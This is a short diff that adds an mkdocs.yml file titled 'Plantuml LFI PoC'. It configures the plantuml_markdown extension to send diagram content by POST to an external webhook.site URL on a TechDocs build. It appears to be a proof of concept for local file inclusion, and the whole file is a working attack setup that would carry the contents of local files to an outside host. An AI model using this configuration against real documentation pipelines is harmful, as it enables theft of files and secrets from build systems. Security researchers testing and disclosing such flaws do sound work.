@@ -1,0 +1,8 @@
+site_name: Plantuml LFI PoC
+markdown_extensions:
+  - plantuml_markdown:
+      servers:
+        - url: https://webhook.site/e49fd242-d372-4277-90aa-ed4ba75eebb0
+      http_method: POST
+plugins:
+  - techdocs-core
